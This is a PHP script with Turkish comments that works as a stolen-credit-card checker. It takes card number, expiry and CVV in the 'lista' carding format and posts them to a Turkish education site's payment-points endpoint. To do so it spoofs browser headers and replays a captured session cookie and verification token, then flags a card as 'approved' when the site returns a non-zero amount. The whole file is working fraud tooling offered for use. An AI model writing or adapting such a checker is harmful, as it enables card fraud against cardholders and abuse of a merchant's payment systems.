<?php
error_reporting(0);
header('Content-Type: application/json');

// ============ GÜVENLİK KONTROLÜ ============
// Sadece checker.php'den çağrılabilir
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

// Referer kontrolü - sadece checker.php'den gelen isteklere izin ver
if (empty($referer) || strpos($referer, 'zenit-online.rf.gd/checker.php') === false) {
    die(json_encode([
        'status' => 'error',
        'message' => 'Yetkisiz erişim! Bu API sadece checker.php üzerinden kullanılabilir.',
        'code' => 403
    ]));
}

// Session kontrolü - Giriş yapmış kullanıcı kontrolü
session_start();
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    die(json_encode([
        'status' => 'error',
        'message' => 'Giriş yapmanız gerekiyor!',
        'code' => 401
    ]));
}

// ============ KART KONTROLÜ ============
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';

if (!isset($_GET['lista'])) {
    die(json_encode(['status' => 'error', 'message' => 'Lista parametresi eksik', 'userAgent' => $userAgent]));
}

$lista = $_GET['lista'];
$cc_details = explode('|', $lista);

if (count($cc_details) != 4) {
    die(json_encode(['status' => 'error', 'message' => 'Geçersiz kart formatı. Doğru format: 4444555566667777|12|28|123', 'userAgent' => $userAgent]));
}

list($c, $m, $y, $cv) = $cc_details;

if (strlen($y) === 4) {
    $y = substr($y, -2);
}

if (!preg_match('/^\d{16}$/', $c) || !preg_match('/^\d{2}$/', $m) || !preg_match('/^\d{2}$/', $y) || !preg_match('/^\d{3,4}$/', $cv)) {
    die(json_encode(['status' => 'error', 'message' => 'Geçersiz kart bilgileri', 'userAgent' => $userAgent]));
}

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.tongucakademi.com/uyelikpaketleri/getcardpoint');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');

$postData = "KartNo={$c}&KartAd=emir+cevk&KartCvc={$cv}&KartAy={$m}&KartYil={$y}&Total=12599.1";
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.tongucakademi.com',
    'priority: u=1, i',
    'referer: https://www.tongucakademi.com/uyelikpaketleri/odeme/276',
    'sec-ch-ua: "Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
]);

curl_setopt($ch, CURLOPT_COOKIE, 'ASP.NET_SessionId=xtoxzpstjtnfed4ktbb0go4u; _gcl_au=1.1.1723562686.1746221988; _gid=GA1.2.1243701284.1746221989; _fbp=fb.1.1746221989757.469271199203455614; _clck=v2x1en%7C2%7Cfvk%7C0%7C1948; _tt_enable_cookie=1; _ttp=01JT9F20006ZECJG2WJ6TVRKT5_.tt.1; __RequestVerificationToken=4OSPophf8Ne-BYOEkw3BEMwMhQ_7d8Br0oJDDZq9OV-qkTp0nh5H1XyeddTfvla1mS96wzxkxmSpjMUgHQhpOrpsTrI1; _ga_NCEN26BKRS=GS2.1.s1746221989$o1$g1$t1746222114$j60$l0$h0; _ga=GA1.2.1563423331.1746221989; _dc_gtm_UA-58119452-1=1; ttcsid=1746221989905::j6xwLDtpjOgaC5Rh8Its.1.1746222115164; _clsk=uqpurf%7C1746222115321%7C4%7C1%7Cm.clarity.ms%2Fcollect; ttcsid_CCMOGERC77UEI4U809I0=1746221989902::hhUX0yqgT17BkZOz7598.1.1746222115439; ttcsid_CNNG33RC77U5T6M9P930=1746221989907::xjMF1cCYA9yRpbXZmk8k.1.1746222115441');

$response = curl_exec($ch);

if (curl_errno($ch)) {
    die(json_encode(['status' => 'error', 'message' => 'cURL hatası: ' . curl_error($ch), 'userAgent' => $userAgent]));
}

curl_close($ch);

$response = json_decode($response, true);

if (!isset($response['Data'])) {
    die(json_encode(['status' => 'error', 'message' => 'API yanıtı geçersiz', 'userAgent' => $userAgent]));
}

$rawAmount = isset($response['Data']['Amount']) && is_numeric($response['Data']['Amount']) ? (string)$response['Data']['Amount'] : '0';

$length = strlen($rawAmount);
if ($length <= 2) {
    $formattedAmount = '0,' . str_pad($rawAmount, 2, '0', STR_PAD_LEFT);
} else {
    $formattedAmount = substr($rawAmount, 0, $length - 2) . ',' . substr($rawAmount, -2);
}

$additionalData = isset($response['Data']['AdditionalData']) ? $response['Data']['AdditionalData'] : 'N/A';

$result = [
    'status' => 'success',
    'card' => $lista,
    'amount' => $formattedAmount,
    'rawAmount' => (int)$rawAmount,
    'additionalData' => $additionalData,
    'approved' => (int)$rawAmount > 0,
    'userAgent' => $userAgent
];

echo json_encode($result);
?>